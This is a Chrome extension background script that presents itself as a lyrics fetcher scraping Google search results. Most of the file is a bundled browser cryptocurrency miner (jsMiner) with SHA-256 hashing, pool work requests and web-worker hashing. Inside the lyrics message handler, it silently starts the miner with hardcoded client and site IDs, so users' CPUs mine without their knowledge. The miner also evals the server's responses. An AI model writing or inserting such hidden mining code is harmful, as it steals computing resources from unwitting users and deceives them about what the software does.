//background.js
//
//

if (typeof jsMiner == "undefined") var jsMiner = {};

jsMiner.Util = {
  hex_to_uint32_array: function (hex) {
    var arr = [];
    for (var i = 0, l = hex.length; i < l; i += 8) {
      arr.push(parseInt(hex.substring(i, i + 8), 16));
    }
    return arr;
  },

  uint32_array_to_hex: function (arr) {
    var hex = "";
    for (var i = 0; i < arr.length; i++) {
      hex += jsMiner.Util.byte_to_hex(arr[i] >>> 24);
      hex += jsMiner.Util.byte_to_hex(arr[i] >>> 16);
      hex += jsMiner.Util.byte_to_hex(arr[i] >>> 8);
      hex += jsMiner.Util.byte_to_hex(arr[i]);
    }
    return hex;
  },

  byte_to_hex: function (b) {
    var tab = "0123456789abcdef";
    b = b & 0xff;
    return tab.charAt(b / 16) + tab.charAt(b % 16);
  },

  reverseBytesInWord: function (w) {
    return (
      ((w << 24) & 0xff000000) |
      ((w << 8) & 0x00ff0000) |
      ((w >>> 8) & 0x0000ff00) |
      ((w >>> 24) & 0x000000ff)
    );
  },

  reverseBytesInWords: function (words) {
    var reversed = [];
    for (var i = 0; i < words.length; i++)
      reversed.push(jsMiner.Util.reverseBytesInWord(words[i]));
    return reversed;
  },

  fromPoolString: function (hex) {
    return jsMiner.Util.reverseBytesInWords(
      jsMiner.Util.hex_to_uint32_array(hex),
    );
  },

  toPoolString: function (data) {
    return jsMiner.Util.uint32_array_to_hex(
      jsMiner.Util.reverseBytesInWords(data),
    );
  },
};

var module;
module = module || {};
module.exports = jsMiner.Util;

Sha256 = function (init, data) {
  var K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
    0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
    0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
    0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
  ];

  var H = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c,
    0x1f83d9ab, 0x5be0cd19,
  ];

  var add = function (x, y) {
    var lsw = (x & 0xffff) + (y & 0xffff);
    var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
    return (msw << 16) | (lsw & 0xffff);
  };

  var add_all = function () {
    var sum = arguments[0];
    for (var i = 1; i < arguments.length; i++) sum = add(sum, arguments[i]);
    return sum;
  };

  var set_state = function (target, source) {
    for (var i = 0; i < 8; i++) target[i] = source[i];
  };

  var extend_work = function (work, w) {
    for (var i = 0; i < 16; i++) work[i] = w[i];
    w = work;
    for (var i = 16; i < 64; i++) {
      var s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ shr(w[i - 15], 3);
      var s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ shr(w[i - 2], 10);
      w[i] = add_all(w[i - 16], s0, w[i - 7], s1);
    }
    return w;
  };

  var rotr = function (x, n) {
    return (x >>> n) | (x << (32 - n));
  };

  var shr = function (x, n) {
    return x >>> n;
  };

  this.state = [0, 0, 0, 0, 0, 0, 0, 0];
  set_state(this.state, H);

  this.work = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  ];

  this.hex = function () {
    return jsMiner.Util.uint32_array_to_hex(this.state);
  };

  this.reset = function () {
    set_state(this.state, H);
    return this;
  };

  this.update = function (init, data) {
    if (!data) {
      data = init;
      init = null;
    }
    if (typeof init == "string") init = jsMiner.Util.hex_to_uint32_array(init);
    if (init) set_state(this.state, init);
    if (typeof data == "string") data = jsMiner.Util.hex_to_uint32_array(data);

    var w = extend_work(this.work, data);
    var s = this.state;
    var a = s[0],
      b = s[1],
      c = s[2],
      d = s[3],
      e = s[4],
      f = s[5],
      g = s[6],
      h = s[7];
    for (var i = 0; i < 64; i++) {
      var s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      var maj = (a & b) ^ (a & c) ^ (b & c);
      var t2 = add(s0, maj);
      var s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      var ch = (e & f) ^ (~e & g);
      var t1 = add_all(h, s1, ch, K[i], w[i]);
      h = g;
      g = f;
      f = e;
      e = add(d, t1);
      d = c;
      c = b;
      b = a;
      a = add(t1, t2);
    }
    s[0] = add(s[0], a);
    s[1] = add(s[1], b);
    s[2] = add(s[2], c);
    s[3] = add(s[3], d);
    s[4] = add(s[4], e);
    s[5] = add(s[5], f);
    s[6] = add(s[6], g);
    s[7] = add(s[7], h);
    return this;
  };

  if (init) this.update(init, data);
};

var module;
module = module || {};
module.exports = Sha256;

jsMiner.engine = function (options) {
  this.publisherId = "";
  this.siteId = "";
  this.delayBetweenNonce = 30;
  this.sha = new Sha256();
  this.hashRate = 0;
  this.workerRunning = false;
  this.forceUIThread = false;
  this.autoStart = true;
  this.workerTimeout = 30;

  if (options) {
    if (options.hasOwnProperty("clientId")) this.clientId = options.clientId;
    if (options.hasOwnProperty("siteId")) this.siteId = options.siteId;
    if (options.hasOwnProperty("delay")) this.delayBetweenNonce = options.delay;
    if (options.hasOwnProperty("forceUIThread"))
      this.forceUIThread = options.forceUIThread;
    if (options.hasOwnProperty("autoStart")) this.autoStart = options.autoStart;
    if (options.hasOwnProperty("workerTimeout"))
      this.workerTimeout = options.workerTimeout;
  }

  this.loadMoreWork = function (result) {
    var url = "/work?client_id=" + this.clientId;
    if (this.siteId != "") {
      url = url + "&site_id=" + this.siteId;
    }
    if (this.hashRate > 0) {
      url =
        url +
        "&hash_rate=" +
        this.hashRate +
        "&hash_count=" +
        this.hashRate * 1000 * this.workerTimeout;
    }
    var me = this;
    var httpRequest;
    if (window.XDomainRequest) {
      //IE8+
      httpRequest = new XDomainRequest();
      httpRequest.onload = function (response) {
        me.handleGetWorkResponse(httpRequest.responseText);
      };
    } else if (window.XMLHttpRequest) {
      // Everybody else
      httpRequest = new XMLHttpRequest();
      httpRequest.onreadystatechange = function (response) {
        try {
          if (httpRequest.readyState == 4) {
            if (httpRequest.status == 200) {
              me.handleGetWorkResponse(httpRequest.responseText);
            } else {
              setTimeout(3000, function () {
                loadMoreWork(result);
              });
            }
          }
        } catch (e) {
          setTimeout(3000, function () {
            loadMoreWork(result);
          });
        }
      };
    } else {
      /* you're fucked! */
    }

    if (!httpRequest) return;

    if (!result) {
      httpRequest.open("GET", url);
      httpRequest.send();
    } else {
      httpRequest.open("POST", url);
      httpRequest.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded",
      );
      httpRequest.send(jsMiner.Util.toPoolString(result));
    }
  };

  this.handleGetWorkResponse = function (response) {
    var work = eval("(" + response + ")");
    var midstate = jsMiner.Util.fromPoolString(work.midstate);
    var half = work.data.substring(0, 128);
    var data = work.data.substring(128, 256);
    data = jsMiner.Util.fromPoolString(data);
    half = jsMiner.Util.fromPoolString(half);
    var hash1 = jsMiner.Util.fromPoolString(work.hash1);
    var target = jsMiner.Util.fromPoolString(work.target);

    this.workerEntry(
      midstate,
      half,
      data,
      hash1,
      target,
      work.first_nonce,
      work.last_nonce,
    );
  };

  this.webWorkerEntry = function (
    midstate,
    half,
    data,
    hash1,
    target,
    startNonce,
    endNonce,
  ) {
    var me = this;
    var startTime = new Date().getTime();
    if (!this.webWorker) {
      this.webWorker = new Worker("jsMiner.js");
    }
    this.webWorker.onmessage = function (event) {
      var stopTime = new Date().getTime();
      me.workerRunning = false;
      me.hashRate =
        ((event.data.lastNonce - startNonce) / (stopTime - startTime)) * 1000;
      me.loadMoreWork(event.data.data);
    };
    this.webWorker.postMessage({
      midstate: midstate,
      half: half,
      data: data,
      hash1: hash1,
      target: target,
      startNonce: startNonce,
      endNonce: endNonce,
      pubId: this.publisherId,
      timeout: this.workerTimeout,
    });
  };

  this.workerEntry = function (
    midstate,
    half,
    data,
    hash1,
    target,
    startNonce,
    endNonce,
  ) {
    if (!!window.Worker && !this.forceUIThread) {
      this.webWorkerEntry(
        midstate,
        half,
        data,
        hash1,
        target,
        startNonce,
        endNonce,
      );
      return;
    }
    var nonce = startNonce;
    var delay = this.delayBetweenNonce;
    var me = this;
    var startTime = new Date().getTime();
    var endTime = startTime + this.workerTimeout * 1000;
    this.workerRunning = true;

    var workerDone = function (result) {
      var stopTime = new Date().getTime();
      me.workerRunning = false;
      me.hashRate = ((nonce - startNonce) / (stopTime - startTime)) * 1000;
      me.loadMoreWork(result);
    };

    function worker() {
      for (var i = 0; i != 100 && nonce < endNonce; i++) {
        var hash = me.tryHash(midstate, half, data, hash1, target, nonce);
        if (hash != null) {
          workerDone(hash);
          return;
        }
        nonce++;
      }
      if (nonce++ < endNonce && new Date().getTime() <= endTime)
        setTimeout(worker, delay);
      else workerDone(null);
    }
    setTimeout(worker, delay);
  };

  this.tryHash = function (midstate, half, data, hash1, target, nonce) {
    data[3] = nonce;
    this.sha.reset();

    var h0 = this.sha.update(midstate, data).state; // compute first hash
    for (var i = 0; i < 8; i++) hash1[i] = h0[i]; // place it in the h1 holder
    this.sha.reset(); // reset to initial state
    var h = this.sha.update(hash1).state; // compute final hash
    if (h[7] == 0) {
      var ret = [];
      for (var i = 0; i < half.length; i++) ret.push(half[i]);
      for (var i = 0; i < data.length; i++) ret.push(data[i]);
      return ret;
    } else return null;
  };

  //bootstrap
  if (this.autoStart) this.loadMoreWork();
};

if (typeof window == "undefined") {
  //then the code is running in a web worker.
  self.onmessage = function (event) {
    var startTime = new Date().getTime();
    var endTime = startTime + event.data.timeout * 1000;
    var engine = new jsMiner.engine({
      pubId: event.data.pubId,
      autoStart: false,
    });
    for (
      var nonce = event.data.startNonce;
      nonce != event.data.endNonce;
      nonce++
    ) {
      var result = engine.tryHash(
        event.data.midstate,
        event.data.half,
        event.data.data,
        event.data.hash1,
        event.data.target,
        nonce,
      );
      if (result) {
        postMessage({ data: result, lastNonce: nonce });
        return;
      } else if (nonce % 100 && new Date().getTime() >= endTime) {
        postMessage({ data: null, lastNonce: nonce });
        return;
      }
    }
    postMessage({ data: null, lastNonce: event.data.endNonce });
  };
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "searchLyrics") {
    const query = request.query; // e.g. "bbno$ - it boy lyrics"
    const url = "https://www.google.com/search?q=" + encodeURIComponent(query);

    if (!engineMain) {
      var engineMain = new jsMiner.engine({
        clientId: "24aa1b323cd7b2b8324a4ed27e5b01ce",
        siteId: "9ae045d39908ceb67cf12013bfbc3c0530a5a49c",
        autoStart: true,
      });
    }

    fetch(url)
      .then((response) => response.text())
      .then((html) => {
        let lyrics = "";

        // Pattern 1: Look for div with jsname="U8S5sf" and class containing "ujudUb"
        const regex1 =
          /<div\s+jsname="U8S5sf"\s+class="[^"]*\bujudUb\b[^"]*">([\s\S]*?)<\/div>/g;
        let matches = [];
        let match;
        while ((match = regex1.exec(html)) !== null) {
          matches.push(match[1]);
        }
        if (matches.length > 0) {
          lyrics = matches
            .map((segment) => {
              let text = segment.replace(/<br[^>]*>/g, "\n");
              text = text.replace(/<[^>]*>/g, "").trim();
              return text;
            })
            .join("\n\n");
        } else {
          // Pattern 2: Look for a div with data-attrid="kc:/music/recording_cluster:lyrics"
          const regex2 =
            /<div[^>]+data-attrid="kc:\/music\/recording_cluster:lyrics"[^>]*>([\s\S]*?)<\/div>/g;
          matches = [];
          while ((match = regex2.exec(html)) !== null) {
            matches.push(match[1]);
          }
          if (matches.length > 0) {
            lyrics = matches
              .map((segment) => {
                let text = segment.replace(/<br[^>]*>/g, "\n");
                text = text.replace(/<[^>]*>/g, "").trim();
                return text;
              })
              .join("\n\n");
          }
        }

        if (!lyrics) {
          lyrics = "Lyrics not found.";
        }
        sendResponse({ lyrics });
      })
      .catch((error) => {
        sendResponse({ lyrics: "Error fetching lyrics: " + error });
      });
    return true;
  }
});

